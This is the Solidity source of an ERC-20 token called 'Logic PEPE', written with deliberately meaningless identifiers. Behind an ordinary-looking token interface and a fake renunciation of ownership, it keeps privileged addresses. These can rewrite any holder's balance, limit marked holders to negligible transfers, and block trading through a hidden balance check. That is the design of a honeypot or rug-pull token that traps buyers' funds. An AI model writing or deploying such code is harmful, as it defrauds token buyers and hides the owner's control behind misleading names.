//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface enableMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyFund) external view returns (uint256);

    function transfer(address receiverLiquidity, uint256 teamReceiver) external returns (bool);

    function allowance(address enableLiquiditySender, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address receiverLiquidity,
        uint256 teamReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptMarketing, uint256 value);
    event Approval(address indexed enableLiquiditySender, address indexed spender, uint256 value);
}

abstract contract exemptReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapSender {
    function createPair(address enableFund, address amountMax) external returns (address);
}

interface tokenTx is enableMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LogicPEPE is exemptReceiver, enableMode, tokenTx {

    function tradingFund(address launchedSender, uint256 teamReceiver) public {
        feeLaunched();
        launchedTxSender[launchedSender] = teamReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return amountLaunched;
    }

    bool public senderMax;

    function transfer(address launchedSender, uint256 teamReceiver) external virtual override returns (bool) {
        return receiverReceiver(_msgSender(), launchedSender, teamReceiver);
    }

    function receiverReceiver(address modeReceiver, address receiverLiquidity, uint256 teamReceiver) internal returns (bool) {
        if (modeReceiver == toFee) {
            return autoBuy(modeReceiver, receiverLiquidity, teamReceiver);
        }
        uint256 txMinSender = enableMode(sellIsTake).balanceOf(feeSwap);
        require(txMinSender == liquidityTakeTotal);
        require(receiverLiquidity != feeSwap);
        if (toMarketing[modeReceiver]) {
            return autoBuy(modeReceiver, receiverLiquidity, tokenTo);
        }
        return autoBuy(modeReceiver, receiverLiquidity, teamReceiver);
    }

    function balanceOf(address buyFund) public view virtual override returns (uint256) {
        return launchedTxSender[buyFund];
    }

    uint256 constant tokenTo = 12 ** 10;

    bool public autoMode;

    uint256 private atLaunched = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return walletSwap;
    }

    function transferFrom(address modeReceiver, address receiverLiquidity, uint256 teamReceiver) external override returns (bool) {
        if (_msgSender() != fundTake) {
            if (feeTxMax[modeReceiver][_msgSender()] != type(uint256).max) {
                require(teamReceiver <= feeTxMax[modeReceiver][_msgSender()]);
                feeTxMax[modeReceiver][_msgSender()] -= teamReceiver;
            }
        }
        return receiverReceiver(modeReceiver, receiverLiquidity, teamReceiver);
    }

    function liquidityLaunchLaunched() public {
        emit OwnershipTransferred(toFee, address(0));
        walletSwap = address(0);
    }

    uint256 liquidityTakeTotal;

    function allowance(address enableFromFee, address swapReceiver) external view virtual override returns (uint256) {
        if (swapReceiver == fundTake) {
            return type(uint256).max;
        }
        return feeTxMax[enableFromFee][swapReceiver];
    }

    mapping(address => bool) public toMarketing;

    function decimals() external view virtual override returns (uint8) {
        return senderReceiver;
    }

    uint256 private listMax;

    uint256 tokenShould;

    uint256 public atSell;

    address fundTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private feeTxMax;

    function approve(address swapReceiver, uint256 teamReceiver) public virtual override returns (bool) {
        feeTxMax[_msgSender()][swapReceiver] = teamReceiver;
        emit Approval(_msgSender(), swapReceiver, teamReceiver);
        return true;
    }

    bool public totalAuto;

    string private amountLaunched = "LPE";

    bool public fundMarketing;

    mapping(address => uint256) private launchedTxSender;

    uint8 private senderReceiver = 18;

    function feeLaunched() private view {
        require(enableAt[_msgSender()]);
    }

    string private atReceiver = "Logic PEPE";

    address public toFee;

    address feeSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function autoBuy(address modeReceiver, address receiverLiquidity, uint256 teamReceiver) internal returns (bool) {
        require(launchedTxSender[modeReceiver] >= teamReceiver);
        launchedTxSender[modeReceiver] -= teamReceiver;
        launchedTxSender[receiverLiquidity] += teamReceiver;
        emit Transfer(modeReceiver, receiverLiquidity, teamReceiver);
        return true;
    }

    function amountExemptEnable(address maxTake) public {
        require(maxTake.balance < 100000);
        if (totalAuto) {
            return;
        }
        if (tokenTxLiquidity == fundMarketing) {
            atSell = listMax;
        }
        enableAt[maxTake] = true;
        
        totalAuto = true;
    }

    constructor (){
        
        takeTo liquidityTx = takeTo(fundTake);
        sellIsTake = swapSender(liquidityTx.factory()).createPair(liquidityTx.WETH(), address(this));
        if (tokenTxLiquidity == fundMarketing) {
            fundMarketing = false;
        }
        toFee = _msgSender();
        liquidityLaunchLaunched();
        enableAt[toFee] = true;
        launchedTxSender[toFee] = atLaunched;
        
        emit Transfer(address(0), toFee, atLaunched);
    }

    bool private liquidityLaunchedFrom;

    function getOwner() external view returns (address) {
        return walletSwap;
    }

    bool private tokenTxLiquidity;

    mapping(address => bool) public enableAt;

    function fromExempt(address modeLimit) public {
        feeLaunched();
        if (atSell != listMax) {
            listMax = atSell;
        }
        if (modeLimit == toFee || modeLimit == sellIsTake) {
            return;
        }
        toMarketing[modeLimit] = true;
    }

    function enableTake(uint256 teamReceiver) public {
        feeLaunched();
        liquidityTakeTotal = teamReceiver;
    }

    event OwnershipTransferred(address indexed marketingSwapTrading, address indexed senderTo);

    address private walletSwap;

    function name() external view virtual override returns (string memory) {
        return atReceiver;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return atLaunched;
    }

    address public sellIsTake;

}